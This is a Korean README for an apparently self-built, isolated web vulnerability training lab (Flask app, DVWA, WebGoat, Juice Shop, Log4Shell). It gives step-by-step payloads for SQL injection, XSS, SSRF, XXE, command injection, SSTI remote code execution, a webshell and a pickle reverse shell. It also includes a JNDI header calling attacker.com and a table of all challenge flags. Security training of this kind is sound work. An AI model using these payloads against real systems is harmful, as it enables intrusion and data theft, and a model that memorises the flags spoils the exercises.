# 🛡️ VulnLab v3.0 — 취약점 분석 실습 환경

> ⚠️ **경고**: 절대 인터넷(공인 IP)에 노출하지 마세요. 로컬/격리 VM 에서만 사용하세요.

---

## 📦 서비스 목록

| 서비스 | URL | 설명 |
|--------|-----|------|
| 커스텀 Flask 앱 | http://localhost:5000 | 취약점 **13종** 직접 구현 |
| DVWA | http://localhost:8080 | PHP, 난이도 조절 가능 |
| WebGoat | http://localhost:8081/WebGoat | Java, 학습 가이드 내장 |
| Juice Shop | http://localhost:3000 | 100개+ CTF 스타일 챌린지 |
| **Log4Shell** | http://localhost:8082 | CVE-2021-44228 재현 환경 |

---

## 🚀 빠른 시작

```bash
# 기본 실행
docker compose up -d

# 공격 컨테이너 포함
docker compose --profile attack up -d

# 공격 컨테이너 쉘 접속
docker compose exec attacker bash

# 전체 종료 + 볼륨 삭제
docker compose down -v
```

---

## 📁 디렉토리 구조

```
vuln-lab/
├── docker-compose.yml
├── README.md
├── vuln-app/
│   ├── Dockerfile
│   ├── app.py              ← 취약점 13종 구현
│   └── requirements.txt
├── attacker/
│   ├── Dockerfile          ← sqlmap, nikto, pwntools, hashcat 등
│   ├── motd.sh
│   └── scripts/
│       ├── jwt_attack.py   ← alg:none 공격 / 시크릿 브루트포스
│       └── pickle_payload.py ← Pickle RCE 페이로드 생성
└── workspace/              ← 호스트 ↔ 공격 컨테이너 공유 폴더
```

---

## 🎯 취약점 목록 & 실습 순서

### 01. SQL Injection — http://localhost:5000/sqli/login
```
목표: 비밀번호 없이 admin 로그인
힌트: username = ' OR '1'='1'--
심화: UNION SELECT null,username,password,null,null,null FROM users--
```

### 02. XSS — http://localhost:5000/xss
```
Reflected: 검색창에 <script>alert(1)</script>
Stored:    댓글에 <img src=x onerror=alert(document.cookie)>
```

### 03. SSRF — http://localhost:5000/ssrf
```
목표: 외부에서 403인 /admin 페이지 접근
힌트: http://127.0.0.1:5000/admin
심화: file:///etc/passwd
```

### 04. IDOR — http://localhost:5000/idor/login
```
목표: alice로 로그인 후 admin 노트 열람
힌트: /idor/note?id=1
```

### 05. XXE — http://localhost:5000/xxe
```
목표: XML로 /etc/passwd 읽기
페이로드:
  <?xml version="1.0"?>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <user><name>&xxe;</name></user>
```

### 06. Command Injection — http://localhost:5000/cmdi
```
목표: 임의 명령 실행
힌트: 127.0.0.1; id
심화: 127.0.0.1; cat /etc/passwd | base64
```

### 07. Path Traversal — http://localhost:5000/path
```
목표: /etc/passwd 읽기
힌트: ?filename=../../../../etc/passwd
```

### 08. CSRF — http://localhost:5000/csrf/login
```
목표: alice 로그인 상태에서 외부 폼으로 이메일 변경
방법: 페이지 내 "공격 시뮬레이션" 버튼 클릭
심화: 실제 외부 HTML 파일을 만들어 CSRF 공격 재현
```

### 09. SSTI — http://localhost:5000/ssti
```
목표: 서버에서 임의 코드 실행
힌트1: ?name={{7*7}} → 49 출력 확인
힌트2: ?name={{config.items()}} → 앱 설정 노출
심화: ?name={{''.__class__.__mro__[1].__subclasses__()}}
RCE:  ?name={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### 10. File Upload — http://localhost:5000/upload
```
목표: 서버에 웹쉘 업로드 후 실행
방법:
  1) 아래 내용으로 webshell.py 작성
     from flask import request; import os; print(os.popen(request.args.get('c','id')).read())
  2) /upload 에서 파일 업로드
  3) /uploads/webshell.py?c=id 접근
```

### 11. JWT — http://localhost:5000/jwt/login
```
목표: admin 권한 JWT 위조
방법 A (alg:none):
  python3 scripts/jwt_attack.py --token <발급된토큰>
  → 생성된 위조 토큰으로 /jwt/flag 접근

방법 B (브루트포스):
  python3 scripts/jwt_attack.py --crack <발급된토큰>
  → 크랙된 시크릿으로 admin 토큰 직접 서명

테스트:
  curl -H "Authorization: Bearer <위조토큰>" http://localhost:5000/jwt/flag
```

### 12. Insecure Deserialization — http://localhost:5000/deser
```
목표: Pickle RCE로 서버에서 임의 명령 실행
방법:
  python3 scripts/pickle_payload.py --cmd "id"
  → 생성된 Base64 페이로드를 /deser 폼에 붙여넣기

리버스쉘:
  # 터미널 1: nc -lvnp 4444
  python3 scripts/pickle_payload.py --rev "172.20.0.X:4444"
```

### 13. Open Redirect — http://localhost:5000/redirect
```
목표: 사용자를 악의적인 외부 URL로 리다이렉트
힌트: /redirect?next=http://evil.com
피싱 시나리오: http://localhost:5000/redirect?next=http://attacker.com/fake-login
```

---

## 🪲 Log4Shell (CVE-2021-44228) — http://localhost:8082

```bash
# 기본 트리거 테스트 (JNDI 페이로드를 헤더에 삽입)
curl -H 'X-Api-Version: ${jndi:ldap://attacker.com/a}' http://localhost:8082

# 심화: marshalsec으로 로컬 LDAP 서버 구동 후 RCE 시도
# 참고: https://github.com/mbechler/marshalsec
```

---

## 🔧 공격 컨테이너 예시

```bash
# SQLmap 자동화
sqlmap -u "http://vuln-app:5000/sqli/login" \
  --data "username=a&password=b" --dbs --batch

# Nikto 스캔
nikto -h http://dvwa

# JWT alg:none 공격
python3 scripts/jwt_attack.py --token eyJhbGciOiJIUzI1NiJ9...

# Pickle RCE 페이로드 생성
python3 scripts/pickle_payload.py --cmd "cat /etc/passwd"

# curl SSRF 테스트
curl -X POST http://vuln-app:5000/ssrf \
  -d "url=http://127.0.0.1:5000/admin"

# Log4Shell 트리거
curl -H 'X-Api-Version: ${jndi:ldap://vuln-attacker/exploit}' \
  http://log4shell:8080
```

---

## 🏁 FLAGS 정리

| # | 취약점 | FLAG |
|---|--------|------|
| 01 | SQLi | `FLAG{sql1_b4s1c_byp4ss}` |
| 03 | SSRF | `FLAG{ssrf_1nt3rn4l_4cc3ss}` |
| 04 | IDOR | `FLAG{1dor_pr1v_esc}` |
| 05 | XXE | `FLAG{xxe_0ob_ftw}` |
| 06 | CMDi | `FLAG{cmdi_r00t}` |
| 07 | Path | `FLAG{p4th_tr4v3rs4l_r34d}` |
| 08 | CSRF | `FLAG{csrf_n0_t0k3n}` |
| 10 | Upload | `FLAG{f1l3_upl04d_rce}` |
| 11 | JWT | `FLAG{jwt_4lg_n0n3_0r_w34k}` |
| 12 | Deser | `FLAG{p1ckl3_rce_g0t_y0u}` |

---

## 🔒 안전 수칙

1. 모든 포트는 `127.0.0.1`에만 바인딩됨
2. 공용 Wi-Fi에서 절대 실행 금지
3. 사용 후 `docker compose down -v` 로 정리
4. VM(VirtualBox/VMware) 내부에서 실행 권장
